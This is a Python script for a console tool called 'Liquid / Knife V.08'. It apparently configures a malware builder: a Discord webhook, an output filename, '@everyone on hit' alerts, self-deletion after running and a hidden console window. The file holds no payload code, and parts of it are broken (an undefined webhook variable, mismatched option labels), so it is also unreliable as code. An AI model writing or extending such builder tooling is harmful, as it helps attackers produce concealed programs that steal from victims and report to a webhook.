
import os
import sys
import itertools
import time
import threading
done = False
def animate():
   
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rInstalling Packages ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rInstall complete!     ')

t = threading.Thread(target=animate)
t.start()

os.system('py -m pip install --upgrade pip')
os.system('py -m pip install pyfiglet')
os.system('py -m pip install colorama')

#long process here

done = True
everyone = False
remove = False
hide = False
custom = False
customString = ''
filename = ''

import pyfiglet
from colorama import init, Fore, Back, Style
print(Style.BRIGHT+ Fore.CYAN + "")

#Text in slant font
out = pyfiglet.figlet_format("Liquid /", font="slant")
print(out)
print(Style.BRIGHT+ Fore.GREEN + "------------------" +Style.BRIGHT+ Fore.CYAN + "------------------" + Style.BRIGHT+ Fore.BLUE+ "------------------" + Style.BRIGHT+ Fore.WHITE+ "------------------"+ Style.BRIGHT+ Fore.BLUE)
out = pyfiglet.figlet_format("       / Knife V.08", font="slant")
print(out)
discordlink = 'https://discord.gg/8m4AdT88'
print(Style.BRIGHT+ Fore.MAGENTA+'['+ Fore.BLUE + '+'+ Fore.MAGENTA +']'+ Fore.WHITE +' If you have any problems with this please join ' + Fore.CYAN+ discordlink+ Fore.WHITE)
def showHelp():
  
  print(Style.BRIGHT+ Fore.MAGENTA+'-----------------Commands-----------------')
  print(Style.BRIGHT+ Fore.MAGENTA+'['+ Fore.BLUE + 'help'+ Fore.MAGENTA +']'+ Fore.MAGENTA +' |'+Fore.BLUE + 'Description:'+ Fore.CYAN+' This command will show this message'+ Fore.MAGENTA+ '|'+ Fore.WHITE)
  print(Style.BRIGHT+ Fore.MAGENTA+'['+ Fore.BLUE + 'toggle on'+ Fore.MAGENTA +']'+ Fore.MAGENTA +' |'+Fore.BLUE + 'Description:'+ Fore.CYAN+' This will all of the settings to ON'+ Fore.MAGENTA+ '|'+ Fore.WHITE)

  print(Style.BRIGHT+ Fore.MAGENTA+'['+ Fore.BLUE + 'toggle off'+ Fore.MAGENTA +']'+ Fore.MAGENTA +' |'+Fore.BLUE + 'Description:'+ Fore.CYAN+' This will all of the settings to OFF'+ Fore.MAGENTA+ '|'+ Fore.WHITE)
  print(Style.BRIGHT+ Fore.MAGENTA+'['+ Fore.BLUE + 'webhook'+ Fore.MAGENTA +']'+ Fore.MAGENTA +' |'+Fore.BLUE + 'Description:'+ Fore.CYAN+' This will set the webhook'+ Fore.MAGENTA+ '|'+ Fore.WHITE)
  print(Style.BRIGHT+ Fore.MAGENTA+'['+ Fore.BLUE + 'filename'+ Fore.MAGENTA +']'+ Fore.MAGENTA +' |'+Fore.BLUE + 'Description:'+ Fore.CYAN+' This will set the filename'+ Fore.MAGENTA+ '|'+ Fore.WHITE)

  print(Style.BRIGHT+ Fore.MAGENTA+'['+ Fore.BLUE + 'status'+ Fore.MAGENTA +']'+ Fore.MAGENTA +' |'+Fore.BLUE + 'Description:'+ Fore.CYAN+' This will show the status of all of the settings'+ Fore.MAGENTA+ '|'+ Fore.WHITE)
  if(everyone == True):
    print(Style.BRIGHT+ Fore.WHITE+'['+ Fore.GREEN + '1'+ Fore.WHITE +']'+ Fore.GREEN + ' |This will make it ping @everyone on hit|' + Fore.WHITE)
  if(everyone == False):
    print(Style.BRIGHT+ Fore.WHITE+'['+ Fore.RED + '1'+Fore.WHITE +']'+ Fore.RED +' -This will make it ping @everyone on hit '+ Fore.WHITE)
  if(custom == True):
    print(Style.BRIGHT+ Fore.WHITE+'['+ Fore.GREEN + '2'+ Fore.WHITE +']'+ Fore.GREEN +f' -This will show \'{customString}\' on run' + Fore.WHITE)
  if(custom == False):
    print(Style.BRIGHT+ Fore.WHITE+'['+ Fore.RED + '2'+Fore.WHITE +']'+ Fore.RED +' -This will show them a message on run'+ Fore.WHITE)




  if(remove == True):
    print(Style.BRIGHT+ Fore.WHITE+'['+ Fore.GREEN + '3'+ Fore.WHITE +']'+ Fore.GREEN +f' -This will remove the file once ran' + Fore.WHITE)
  if(remove == False):
    print(Style.BRIGHT+ Fore.WHITE+'['+ Fore.RED + '3'+Fore.WHITE +']'+ Fore.RED +' -This will remove the file once ran'+ Fore.WHITE)
  if(hide == True):
    print(Style.BRIGHT+ Fore.WHITE+'['+ Fore.GREEN + '4'+ Fore.WHITE +']'+ Fore.GREEN +f' -This will hide the cmd once ran' + Fore.WHITE)
  if(hide == False):
    print(Style.BRIGHT+ Fore.WHITE+'['+ Fore.RED + '4'+Fore.WHITE +']'+ Fore.RED +' -This will hide the cmd once ran'+ Fore.WHITE)

showHelp()
def setWebhook():
  webhook = input('What webhook would you like to use?')
  print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'setWebhook' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'Set' + Fore.GREEN + '|' + Fore.WHITE+ 'Webhook:' + Fore.BLUE+webhook +Fore.GREEN + '|'+ Fore.WHITE)
  return webhook
def setFilename():
  filename = input('What filename would you like to use?')
  print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'setFilename' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'Set' + Fore.GREEN + '|' + Fore.WHITE+ 'Filename:' + Fore.BLUE+ filename + Fore.GREEN + '|'+Fore.WHITE)
  return filename
def showEveryone(everyone):
  if(everyone == True):
    everyone = False

    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + '@Everyone' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
    return everyone
  elif(everyone == False):
    everyone = True
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + '@Everyone' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE)
    return everyone
def showCustom(custom):
  if(custom == True):
    custom = False
    customString = ''
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'Custom' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
    return custom,customString
  elif(custom == False):
    custom = True
    customString = input(Style.BRIGHT + Fore.WHITE + '['+ Fore.GREEN + '+'+ Fore.WHITE + ']'+ ' -What message would you like to have? ')
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' + Fore.GREEN + ' |'+Fore.WHITE+ 'Module:'+Fore.BLUE + 'Custom' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE + 'Message:' + Fore.BLUE + customString + Fore.GREEN+'|' + Fore.WHITE)
    return custom,customString

def showRemove(remove):
  if(remove == True):
    remove = False

    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'remove' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
    return remove
  elif(remove == False):
    remove = True
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'remove' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE)
    return remove

def toggleOn():
  custom,customString = showCustom(False)
  everyone = showEveryone(False)
  return custom,customString,everyone 
def toggleOff():
  custom,customString = showCustom(True)
  everyone = showEveryone(True)
  return custom,customString,everyone 
def showStatus():
  if(filename == ''):
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'setFilename' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'Not Set' + Fore.RED + '|' + Fore.WHITE)
  elif(filename != ''):
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'setFilename' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'Set' + Fore.GREEN + '|' + Fore.WHITE+ 'Filename:' + Fore.BLUE+ filename + Fore.GREEN + '|'+Fore.WHITE)
  if(webhook == ''):
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'setWebhook' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'Not Set' +  Fore.RED + '|' + Fore.WHITE)
  elif(webhook != ''):
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' +Fore.GREEN + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'setWebhook' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'Set' + Fore.GREEN + '|' + Fore.WHITE+ 'Webhook:' + Fore.BLUE+webhook + Fore.GREEN + '|'+Fore.WHITE)
  showEveryone(not everyone)
  showRemove(not everyone)
  if(custom == True):
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.GREEN + '+'+ Fore.WHITE + ']' + Fore.GREEN + ' |'+Fore.WHITE+ 'Module:'+Fore.BLUE + 'Custom' + Fore.GREEN + '|' + Fore.WHITE + 'Status:' + Fore.GREEN + 'ON' + Fore.GREEN + '|' + Fore.WHITE + 'Message:' + Fore.BLUE + customString + Fore.GREEN+'|' + Fore.WHITE)
  elif(custom == False):
    print(Style.BRIGHT+ Fore.WHITE + '[' + Fore.RED + '-'+ Fore.WHITE + ']' +Fore.RED + ' |'+ Fore.WHITE+ 'Module:'+Fore.BLUE + 'Custom' + Fore.RED + '|' + Fore.WHITE + 'Status:' + Fore.RED + 'OFF' + Fore.RED + '|' + Fore.WHITE)
  



while(True):
  var = input()

  if(var == 'help'):
    showHelp()
  if(var == '1' or var == 'everyone' or var == '@everyone' or var == 'Everyone' or var == '@Everyone'):
    everyone = showEveryone(everyone)
  if(var == '2' or var == 'custom' or var == 'Custom'):
    custom,customString = showCustom(custom)
  if(var == '3' or var == 'hide' or var == 'Hide'):
    remove = showRemove(remove)
  if(var == 'toggle on'):
    custom,customString,everyone = toggleOn()
  if(var == 'toggle off'):
    custom,customString,everyone = toggleOff()
  if(var == 'status'):
    showStatus()
  if(var == 'webhook'):
    webhook = setWebhook()
  if(var == 'filename'):
    filename = setFilename()

    





  
  
